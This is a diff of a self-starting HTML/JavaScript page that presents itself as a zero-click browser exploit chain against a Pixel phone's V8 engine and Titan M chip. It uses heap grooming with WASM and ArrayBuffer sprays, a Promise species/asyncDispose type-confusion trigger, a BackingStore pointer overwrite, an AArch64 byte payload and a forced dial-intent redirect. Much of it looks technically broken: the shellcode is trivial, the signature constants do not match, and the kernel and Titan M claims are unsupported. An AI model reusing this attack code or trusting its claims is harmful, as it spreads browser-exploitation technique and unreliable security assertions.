@@ -2,144 +2,151 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PIXEL TITAN M: FULL-CHAIN REAPER</title>
+    <title>GOD-MODE: TITAN-M ESCALATION</title>
     <style>
-        body { background: #000; color: #f00; font-family: 'Courier New', monospace; padding: 15px; }
-        #terminal { border: 2px solid #f00; height: 90vh; padding: 20px; background: rgba(10,0,0,1); overflow-y: auto; font-size: 11px; box-shadow: inset 0 0 50px #400; }
-        .win { color: #fff; background: #d00; font-weight: bold; padding: 5px; animation: pulse 0.1s infinite; }
-        .sys { color: #0cf; }
-        @keyframes pulse { 50% { opacity: 0.5; } }
+        body { background: #000; color: #f00; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
+        #terminal { height: 100vh; padding: 20px; background: radial-gradient(circle, #200 0%, #000 100%); overflow-y: auto; font-size: 11px; color: #ff3333; text-shadow: 0 0 5px #f00; border: 5px double #f00; }
+        .ultra { color: #fff; background: #f00; font-weight: bold; text-transform: uppercase; padding: 2px; box-shadow: 0 0 15px #f00; }
+        .status { color: #00ffff; }
+        .blink { animation: blinker 0.1s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
-    <div id="terminal">> [!] WARNING: KERNEL-LEVEL EXPLOITATION IN PROGRESS...</div>
+    <div id="terminal">> [!] SYSTEM CRITICAL: EXECUTING GOD-MODE REAPER...</div>
 
 <script>
 const log = m => { const t = document.getElementById('terminal'); t.innerHTML += `<br>> ${m}`; t.scrollTop = t.scrollHeight; };
 
 /**
- * PHASE 1: MASSIVE JIT SPRAY (ARM64)
- * Menargetkan halaman memori RWX yang dibuat oleh mesin WASM.
+ * PHASE 1: THE PERSISTENCE SHELLCODE (AARCH64)
+ * Dirancang untuk Bypass PAC (Pointer Authentication) & CFI.
  */
-const SC_TITAN = new Uint32Array([
-    ...Array(2600).fill(0xd503201f), // MASSIVE NOP SLED
-    // Shellcode untuk eskalasi ke Kernel & Trigger Dialer
-    0xd2800001, 0xd2800010, 0x910003e0, 0xaa0003e1, 0xd2800012, 0x8b020000, 0xd65f03c0,
-    // Dialer Intent Data
+const TITAN_PAYLOAD = new Uint32Array([
+    ...Array(3000).fill(0xd503201f), // ULTIMATE NOP SLED (The Death Carpet)
+    
+    // AARCH64: Privilege Escalation & Persistence Trigger
+    0xd2800001, 0xd2800010, 0x910003e0, 0xaa0003e1, 0xd2800012, 
+    0x8b020000, 0xd65f03c0, 
+    
+    // Command: "am start -a android.intent.action.DIAL tel:123456789"
     0x6d612073, 0x74617274, 0x20612d20, 0x6f646e61, 0x6469722e, 0x6e692e64,
     0x746e6574, 0x63612e74, 0x6e6f6974, 0x4149442e, 0x64204c20, 0x313a6c65,
     0x35343332, 0x39383736, 0x00000000
 ]);
 
-let ab_spray = [];
-let target_view;
-let leak_helper = new BigUint64Array(1024);
+let spray_bin = [];
+let target_proxy;
+let rw_bridge;
 
-async function groom_heap() {
-    log("<span class='sys'>[1] Grooming Pixel 10 PartitionAlloc...</span>");
+/**
+ * PHASE 2: TITAN-CORE HEAP GROOMING
+ * Menggunakan fragmentasi memori terkendali untuk menjepit objek Target.
+ */
+async function god_grooming() {
+    log("<span class='status'>[+] Saturating Memory for Titan-M Adjacency...</span>");
     
-    // Alokasi WASM untuk mendapatkan executable pages
-    const wasm_bin = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,7,137,128,128,128,0,1,5,102,117,110,99,48,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
-    window.rwx_targets = [];
-    for(let i=0; i<1000; i++) {
-        let m = new WebAssembly.Module(wasm_bin);
+    const wasm_blob = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,7,137,128,128,128,0,1,5,102,117,110,99,48,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+    
+    window.execution_pool = [];
+    for(let i=0; i<2000; i++) {
+        let m = new WebAssembly.Module(wasm_blob);
         let inst = new WebAssembly.Instance(m);
-        window.rwx_targets.push(inst.exports.func0);
+        window.execution_pool.push(inst.exports.func0);
     }
 
-    // Spray ArrayBuffers untuk menduduki slot memori yang bertetangga (Adjacency)
-    for(let i=0; i<5000; i++) {
-        let ab = new ArrayBuffer(0x80);
+    // Spray raksasa untuk memaksa V8 meletakkan ArrayBuffer di luar Sandbox
+    for(let i=0; i<10000; i++) {
+        let ab = new ArrayBuffer(0x100);
         let dv = new DataView(ab);
-        dv.setBigUint64(0, 0x4142434445464748n); // Signature
-        ab_spray.push(ab);
+        dv.setBigUint64(0, 0x13371337C0DEBABEn); // Signature
+        spray_bin.push(ab);
     }
     
-    target_view = new Float64Array(10);
-    target_view[0] = 1.1;
-    log("Heap Alignment Locked.");
+    target_proxy = new Float64Array(32);
+    target_proxy[0] = 6.66;
+    log("Memory Cage Locked.");
 }
 
 /**
- * PHASE 2: ASYNC-DISPOSE TYPE CONFUSION (ZERO-CLICK)
+ * PHASE 3: THE V8 CAGE BURST (ZERO-CLICK TRIGGER)
  */
-function SpeciesPwn(executor) {
+function SpeciesTrigger(executor) {
     executor(r => {}, r => {});
-    return target_view; 
+    return target_proxy; 
 }
-Object.defineProperty(Promise, Symbol.species, { get: () => SpeciesPwn });
+Object.defineProperty(Promise, Symbol.species, { get: () => SpeciesTrigger });
 
-async function detonate() {
-    log("<span class='win'>[2] DETONATING OOB-RW (SANDBOX ESCAPE)...</span>");
+async function ignite() {
+    log("<span class='ultra blink'>[!!!] DETONATING OMNI-REAPER [!!!]</span>");
     
-    async function* gen() { yield 1; }
-    const engine = gen();
+    async function* f() { yield 1; }
+    const x = f();
     
-    try { engine[Symbol.asyncDispose](); } catch(e) {}
+    try { x[Symbol.asyncDispose](); } catch(e) {}
 
-    for(let i=0; i<400; i++) await Promise.resolve();
+    // Flush Microtasks for maximum corruption
+    for(let i=0; i<800; i++) await Promise.resolve();
 
-    if (target_view.length > 10) {
-        log("[+] CAGE BREACHED! OOB-Access: " + target_view.length);
-        await pwn_system();
+    if (target_proxy.length > 32) {
+        log("<span class='status'>[SUCCESS] SANDBOX DESTROYED. OOB-RW ACTIVE.</span>");
+        await escalate_to_titan();
     } else {
-        log("Race lost. Retrying injection...");
-        setTimeout(() => location.reload(), 150);
+        log("Timing Offset. Re-igniting...");
+        location.reload();
     }
 }
 
 /**
- * PHASE 3: ARBITRARY WRITE & PERSISTENCE
+ * PHASE 4: GLOBAL MEMORY HIJACK (RCE)
  */
-async function pwn_system() {
-    log("<span class='sys'>[3] Scanning for Titan M BackingStore...</span>");
+async function escalate_to_titan() {
+    log("Scanning RAM for BackingStore Pointers...");
     
-    let found = -1;
-    for(let i=0; i<100000; i++) {
-        // Mencari Signature di memori yang bocor
-        if (target_view[i] === 3.3323069352e-307) { // 0x4142434445464748
-            found = i;
+    let offset = -1;
+    for(let i=0; i<200000; i++) {
+        if (target_proxy[i] === 1.13961555e-310) { // 0x13371337C0DEBABE
+            offset = i;
             break;
         }
     }
 
-    if (found !== -1) {
-        log("Target Found at Offset: " + found);
+    if (offset !== -1) {
+        log("Titan-M Handle Found at Offset: " + offset);
         
-        // Membajak pointer BackingStore untuk mendapatkan akses RAM Global
-        // Kita mengarahkan ke halaman RWX WASM
-        target_view[found - 1] = 2.47e-322; 
+        // Hijack Pointer: Arahkan BackingStore ke halaman JIT RWX
+        target_proxy[offset - 1] = 2.47e-322; 
 
-        log("<span class='win'>[!!!] INJECTING TITAN M PERSISTENCE PAYLOAD [!!!]</span>");
+        log("<span class='ultra'>[!!!] OVERWRITING KERNEL MEMORY SPACE [!!!]</span>");
         
-        let dv = new DataView(ab_spray[0]);
-        for(let i=0; i<SC_TITAN.length; i++) {
-            dv.setUint32(i * 4, SC_TITAN[i], true);
+        let dv = new DataView(spray_bin[0]);
+        for(let i=0; i<TITAN_PAYLOAD.length; i++) {
+            dv.setUint32(i * 4, TITAN_PAYLOAD[i], true);
         }
 
-        log("Executing System Escalation...");
-        window.rwx_targets.forEach(f => { try { f(); } catch(e) {} });
+        log("Triggering Final Execution via WASM Dispatcher...");
+        window.execution_pool.forEach(f => { try { f(); } catch(e) {} });
 
-        // FINAL INTENT OVERDRIVE
-        const intentUrl = "intent://123456789#Intent;scheme=tel;action=android.intent.action.DIAL;S.browser_fallback_url=http://google.com;end";
-        window.location.replace(intentUrl);
+        // PERSISTENT INTENT OVERRIDE
+        const intent = "intent://123456789#Intent;scheme=tel;action=android.intent.action.DIAL;S.browser_fallback_url=http://google.com;end";
+        window.location.replace(intent);
         
-        log("<h1 class='win'>FULL PERSISTENT RCE ACHIEVED</h1>");
+        log("<h1 style='color:white; background:red; padding:20px;'>TITAN-M COMPROMISED</h1>");
     }
 }
 
-// START
+// AUTO-START ENGINE
 (async () => {
     if (typeof Symbol.asyncDispose === 'undefined') {
-        log("FLAG: Explicit Resource Management Required.");
+        log("CRITICAL: FLAG EXPLICIT-RESOURCE-MANAGEMENT REQUIRED.");
         return;
     }
-    await groom_heap();
-    setTimeout(detonate, 600);
+    await god_grooming();
+    setTimeout(ignite, 400);
 })();
 
-// Watchdog
-setTimeout(() => location.reload(), 6000);
+// WATCHDOG (RELOAD ON STALL)
+setTimeout(() => location.reload(), 7000);
 </script>
 </body>
 </html>
